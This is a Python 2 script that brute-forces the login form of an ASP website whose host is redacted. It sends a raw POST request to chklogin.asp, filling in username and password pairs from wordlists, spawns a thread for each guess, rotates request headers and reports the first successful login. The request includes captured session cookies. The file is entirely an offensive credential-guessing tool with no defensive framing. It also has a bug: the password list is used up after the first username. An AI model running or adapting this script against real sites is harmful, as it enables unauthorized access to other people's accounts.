#/usr/bin/env python2
#coding:utf-8

import threading
import time
import os
from py2_lib.hackhttp import hackhttp
from py2_lib.headers import get_headers


hh = hackhttp()
mutex = threading.Lock()





def baopo(user,passwd):
    def run():
        header = get_headers()[0]
        raw="""
POST /chklogin.asp HTTP/1.1
Host: xxx.xxx.net
§test3§
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://xxx.xxx.net/login.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Connection: close
Cookie: ylqxw4875Kill=Time=2019%2D7%2D15+18%3A42%3A15&kill=0; Hzpzs3=199805%5FWebTime=2019%2D7%2D15+18%3A15%3A55; ASPSESSIONIDCSTQSDQD=MIBCDEACJKJMFCMMKFLCKBFO; UM_distinctid=16bf5222b166e-0085654792066-3c6e4645-c0000-16bf5222b193d9; CNZZDATA4159192=cnzz_eid%3D1877512526-1563182551-%26ntime%3D1563182551
Upgrade-Insecure-Requests: 1
name=§test1§&hdnred=&pwd=§test2§&B1=
        """.replace('§test1§',user).replace('§test2§',passwd).replace('§test3§',header)

        code, head, html, redirect, log = hh.http('http://xxx.xxx.net/login.asp', raw=raw)
        if '用户名：' in html:
            mutex.acquire()
            print('[+]开始爆破.')
            print '状态码:'+str(code)
            print '当前用户:',user.strip()
            print '当前密码:',passwd.strip()
            print('[-]登入失败.')
            # print(html)
            time.sleep(0.025)
            os.system('clear')
            mutex.release()

        else:
            print('[+]开始爆破.')
            print('当前用户:'+user.strip())
            print('当前密码:'+passwd.strip())
            print('[+]登入成功.')
            # print(html)
            print('[+]爆破结束.')
            exit(0)

    thread1 = threading.Thread(target=run)
    thread1.start()
    



def main():
    from py2_lib import root
    from py2_lib import _root
    from sys import argv
    upath = argv[1]
    ppath = argv[2]
    r1 = open(upath,'r')
    r2 = open(ppath,'r')
    for username in r1.readlines():
        for password in r2.readlines():
            b1 = baopo(username,password)
    r1.close()
    r2.close()
